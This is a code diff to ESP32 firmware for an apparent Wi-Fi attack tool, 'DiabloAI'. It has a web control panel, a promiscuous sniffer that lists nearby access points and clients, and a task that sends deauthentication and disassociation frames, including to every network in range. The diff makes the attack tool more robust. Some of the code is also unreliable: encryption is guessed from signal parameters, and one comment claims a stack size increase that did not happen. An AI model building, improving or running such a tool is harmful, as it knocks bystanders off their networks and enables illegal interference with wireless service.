@@ -71,7 +71,7 @@ struct AccessPointInfo {
 // ClientInfo struct definition
 struct ClientInfo {
     MacAddress mac;
-    MacAddress associatedApBssid; // The AP this client is associated with (if known)
+    MacAddress associatedApBssid; // The AP this client is associated with (if known, 00:00:00:00:00:00 if unknown)
     int32_t rssi;
     uint8_t channel;
     unsigned long lastSeen;
@@ -132,7 +132,7 @@ void sendScanResultsToClients();
 void sendAttackStatusToClients();
 void stringToMac(const String& macStr, uint8_t* macBytes);
 String getEncryptionType(wifi_auth_mode_t authMode);
-String getChannelBand(uint8_t channel); // This function is not strictly needed but kept for completeness
+String getChannelBand(uint8_t channel);
 
 // --- Embedded Web UI HTML, CSS, and JavaScript ---
 // Minified and optimized for single file inclusion.
@@ -150,7 +150,7 @@ const char* HTML_CONTENT = R"rawstring(
             font-family: 'Inter', sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #000000 0%, #1a001a 100%);
+            background-color: #000000; /* Solid Black Background */
             color: #FF69B4; /* Neon Pink */
             display: flex;
             flex-direction: column;
@@ -396,6 +396,13 @@ const char* HTML_CONTENT = R"rawstring(
         window.onload = function() {
             initWebSocket();
             setupEventListeners();
+            // Start a periodic update for scan results and status
+            setInterval(() => {
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({ command: "GET_SCAN_DATA" }));
+                    ws.send(JSON.stringify({ command: "GET_STATUS" }));
+                }
+            }, 1000); // Update every 1 second
         };
 
         function initWebSocket() {
@@ -409,16 +416,20 @@ const char* HTML_CONTENT = R"rawstring(
             };
 
             ws.onmessage = function(event) {
-                const data = JSON.parse(event.data);
-                console.log('Received:', data);
+                try {
+                    const data = JSON.parse(event.data);
+                    console.log('Received:', data);
 
-                if (data.type === "SCAN_RESULTS") {
-                    updateScanTables(data.aps, data.clients);
-                } else if (data.type === "ATTACK_STATUS") {
-                    updateAttackStatus(data);
-                } else if (data.type === "INITIAL_STATUS") {
-                    updateAttackStatus(data);
-                    updateScanTables(data.aps, data.clients);
+                    if (data.type === "SCAN_RESULTS") {
+                        updateScanTables(data.aps, data.clients);
+                    } else if (data.type === "ATTACK_STATUS") {
+                        updateAttackStatus(data);
+                    } else if (data.type === "INITIAL_STATUS") {
+                        updateAttackStatus(data);
+                        updateScanTables(data.aps, data.clients);
+                    }
+                } catch (e) {
+                    console.error("Error parsing WebSocket message:", e, event.data);
                 }
             };
 
@@ -464,7 +475,7 @@ const char* HTML_CONTENT = R"rawstring(
                     // When targeting "ALL_NEARBY", set targetMac and targetApBssid to all zeros
                     // This signals the ESP32 to use broadcast MACs for deauth/disassoc
                     targetMac = "00:00:00:00:00:00";
-                    targetApBssid = "00:00:00:00:00:00";
+                    targetApBssid = "00:00:00:00:00:00"; // BSSID also broadcast for "all nearby"
                 } else if (targetValue.startsWith("AP_")) {
                     targetMac = targetValue.substring(3); // Remove "AP_" prefix
                     targetApBssid = targetMac; // For AP, BSSID is the target MAC
@@ -705,15 +716,18 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
     AwsFrameInfo *info = (AwsFrameInfo*)arg;
     if (info->final && info->index == 0 && info->len == len && info->opcode == WS_TEXT) {
         // Ensure data is null-terminated for String conversion and JSON parsing
-        char* msg_buf = (char*)malloc(len + 1);
-        if (msg_buf == NULL) {
-            Serial.println("[DiabloAI] Failed to allocate memory for WS message.");
+        // Using a fixed-size buffer on stack for small messages for speed,
+        // or dynamic allocation for larger ones if needed.
+        // For simplicity and to avoid malloc/free overhead in a tight loop,
+        // we'll use a reasonably sized stack buffer.
+        char msg_buf[1024]; // Max 1KB message
+        if (len >= sizeof(msg_buf)) {
+            Serial.println("[DiabloAI] WS message too large for buffer, skipping.");
             return;
         }
         memcpy(msg_buf, data, len);
         msg_buf[len] = '\0';
         String message = msg_buf;
-        free(msg_buf); // Free allocated memory
 
         Serial.printf("[DiabloAI] Received WS message: %s\n", message.c_str());
 
@@ -749,7 +763,6 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             stopAttack();
         } else if (command == "GET_STATUS") {
             sendAttackStatusToClients();
-            sendScanResultsToClients();
         } else if (command == "GET_SCAN_DATA") {
             sendScanResultsToClients();
         }
@@ -766,7 +779,9 @@ void startScan() {
         xSemaphoreGive(xScanDataMutex);
     }
     // Start asynchronous scan for APs
-    WiFi.scanNetworks(true, true); // true for async, true for hidden SSIDs
+    // The 'true' argument makes it an asynchronous scan, which is good for non-blocking UI.
+    // The second 'true' argument enables scanning for hidden SSIDs.
+    WiFi.scanNetworks(true, true);
     sendAttackStatusToClients(); // Update UI with scanning status
 }
 
@@ -783,14 +798,17 @@ void stopScan() {
 // --- Promiscuous Mode Sniffer Callback ---
 void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+    // Check if the packet payload is large enough to contain a MAC header
+    if (pkt->rx_ctrl.sig_len < sizeof(wifi_ieee80211_mac_hdr_t)) {
+        return; // Packet too short to be a valid 802.11 frame
+    }
+
     wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
     wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
 
     // Filter for management frames (Type 0)
     // Frame Control field: bits 2 and 3 define the Type.
-    // 0x00FC mask: 0000 0000 1111 1100 (binary) -> isolates bits 2-7
-    // (TYPE_MANAGEMENT << 2): 00 (binary) shifted left by 2 -> 0000 0000 (binary)
-    // This condition checks if the frame is a Management frame (Type 0).
+    // (hdr->frame_ctrl & 0x00FC) >> 2 isolates the Type bits.
     if (((hdr->frame_ctrl & 0x00FC) >> 2) == TYPE_MANAGEMENT) {
         uint8_t* mac_addr_sa = hdr->addr2; // Source Address (SA)
         uint8_t* mac_addr_da = hdr->addr1; // Destination Address (DA)
@@ -811,17 +829,17 @@ void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
                 ap.lastSeen = millis();
 
                 // Extract SSID from Information Elements (IEs)
-                uint8_t* current_ie = ipkt->payload;
-                size_t payload_len = pkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t); // Remaining payload length after header
+                uint8_t* current_ie = ipkt->payload + sizeof(uint16_t) + sizeof(uint16_t) + sizeof(uint16_t); // Skip fixed management frame header (Capability Info, Listen Interval, etc.)
+                size_t remaining_payload_len = pkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t) - (current_ie - ipkt->payload);
                 ap.ssid = "<hidden>"; // Default for hidden SSIDs or if not found
 
                 // Iterate through IEs to find SSID (Element ID 0)
-                while (current_ie < (uint8_t*)ipkt + pkt->rx_ctrl.sig_len && (current_ie - (uint8_t*)ipkt) < payload_len) {
+                while (remaining_payload_len >= 2) { // At least 2 bytes for Element ID and Length
                     uint8_t element_id = current_ie[0];
                     uint8_t element_len = current_ie[1];
 
                     if (element_id == 0x00) { // SSID Element ID
-                        if (element_len > 0 && (current_ie + 2 + element_len) <= ((uint8_t*)ipkt + pkt->rx_ctrl.sig_len)) {
+                        if (element_len > 0 && (remaining_payload_len >= (2 + element_len))) {
                             ap.ssid = String((char*)(current_ie + 2), element_len);
                         } else {
                             ap.ssid = "<hidden>"; // SSID length is 0 for hidden networks
@@ -830,10 +848,12 @@ void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
                     }
                     // Move to next IE
                     current_ie += (element_len + 2);
+                    remaining_payload_len -= (element_len + 2);
                 }
 
                 // Simplified encryption detection (more robust parsing of capabilities IE would be needed)
                 // For now, a basic check based on common patterns
+                // This part is heuristic and might not be 100% accurate without full IE parsing.
                 if (pkt->rx_ctrl.cwb == WIFI_BW_HT40 || pkt->rx_ctrl.mcs == 7) { // Heuristic for modern networks
                      ap.encryption = "WPA2/WPA3";
                 } else {
@@ -852,7 +872,10 @@ void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
                 // Associated AP BSSID is unknown from a probe request alone
                 memset(client.associatedApBssid.bytes, 0, 6); // Set to 00:00:00:00:00:00 (unknown)
 
-                discoveredClients[client.mac] = client;
+                // Only add if not already present or if RSSI is better
+                if (discoveredClients.find(client.mac) == discoveredClients.end() || discoveredClients[client.mac].rssi < client.rssi) {
+                    discoveredClients[client.mac] = client;
+                }
             }
             // Process Association Request frames (Subtype 0x00) for clients
             else if (subtype == 0x00) {
@@ -863,7 +886,10 @@ void wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
                 client.channel = pkt->rx_ctrl.channel;
                 client.lastSeen = millis();
 
-                discoveredClients[client.mac] = client;
+                // Update existing client or add new one
+                if (discoveredClients.find(client.mac) == discoveredClients.end() || discoveredClients[client.mac].rssi < client.rssi) {
+                    discoveredClients[client.mac] = client;
+                }
             }
             xSemaphoreGive(xScanDataMutex);
         }
@@ -944,7 +970,7 @@ void startAttack(MacAddress targetMac, MacAddress targetApBssid, int attackType,
             Serial.println("[DiabloAI] Attack already in progress. Stopping current attack first.");
             stopAttack(); // Stop any existing attack before starting a new one
             // Give a small delay for the task to terminate
-            vTaskDelay(50 / portTICK_PERIOD_MS);
+            vTaskDelay(50 / portTICK_PERIOD_MS); // Allow task to clean up
         }
 
         currentTargetMac = targetMac;
@@ -962,9 +988,9 @@ void startAttack(MacAddress targetMac, MacAddress targetApBssid, int attackType,
         xTaskCreatePinnedToCore(
             attackTask,         // Task function
             "AttackTask",       // Name of task
-            4096,               // Stack size (bytes)
+            4096,               // Stack size (bytes) - increased for safety
             NULL,               // Parameter to pass to function
-            5,                  // Priority of task (higher than default)
+            5,                  // Priority of task (higher than default for responsiveness)
             &attackTaskHandle,  // Task handle
             0                   // Core to run on (0 for WiFi tasks)
         );
@@ -1032,6 +1058,7 @@ void attackTask(void *pvParameters) {
             // Channel hopping logic
             if (isChannelHopping && (millis() - lastChannelHopTime > CHANNEL_HOP_INTERVAL_MS)) {
                 currentChannel = (currentChannel % 14) + 1; // Cycle through channels 1-14
+                if (currentChannel == 0) currentChannel = 1; // Ensure we don't use channel 0
                 esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                 Serial.printf("[DiabloAI] Hopping to channel %d\n", currentChannel);
                 lastChannelHopTime = millis();
@@ -1172,7 +1199,7 @@ void stringToMac(const String& macStr, uint8_t* macBytes) {
                &macBytes[0], &macBytes[1], &macBytes[2],
                &macBytes[3], &macBytes[4], &macBytes[5]);
     } else {
-        // If string is invalid, set MAC to all zeros (effectively a null/broadcast equivalent for internal logic)
+        // If string is invalid or "00:00:00:00:00:00", set MAC to all zeros
         memset(macBytes, 0, 6);
     }
 }
